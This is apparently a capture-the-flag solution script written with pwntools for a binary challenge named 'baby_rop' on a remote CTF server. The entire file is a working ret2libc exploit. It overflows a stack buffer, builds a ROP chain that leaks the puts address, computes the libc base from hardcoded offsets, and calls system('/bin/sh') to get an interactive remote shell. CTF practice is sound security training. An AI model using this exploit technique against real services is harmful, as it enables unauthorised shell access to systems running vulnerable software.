from importlib.metadata import PathDistribution
from unittest.loader import VALID_MODULE_NAME
from pwn import *
import os

# p = process("./baby_rop")
p = remote("chall8.cybernight.org", 40004)

elf = ELF("./baby_rop")
puts_plt = elf.plt["puts"]
puts_got = elf.got["puts"]

rop = ROP("./baby_rop")
ret = rop.ret.address

# ROPgadget --binary baby_rop -> pop_rdi_ret
pop_rdi_ret = 0x0000000000400683

vuln = elf.functions['vuln'].address

padding = b"A"*10 + p64(ret)

payload = padding
payload += p64(pop_rdi_ret)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(vuln)

p.recvline()
p.sendline(payload)

p.recvline()

leak_puts = u64(p.recv(6).ljust(8,b'\0'))
print(hex(leak_puts)) # 0x7f8ccef9a420

# https://libc.blukat.me/
# puts 7f8ccef9a420
# libc6_2.31-0ubuntu9.9_amd64 
puts_offset = 0x084420
system_offset = 0x052290
bin_sh_offset = 0x1b45bd

leak_base = leak_puts - puts_offset
system = leak_base + system_offset
bin_sh = leak_base + bin_sh_offset

payload = padding
payload += p64(pop_rdi_ret)
payload += p64(bin_sh)
payload += p64(ret)
payload += p64(system)

p.sendline(payload)

p.interactive()
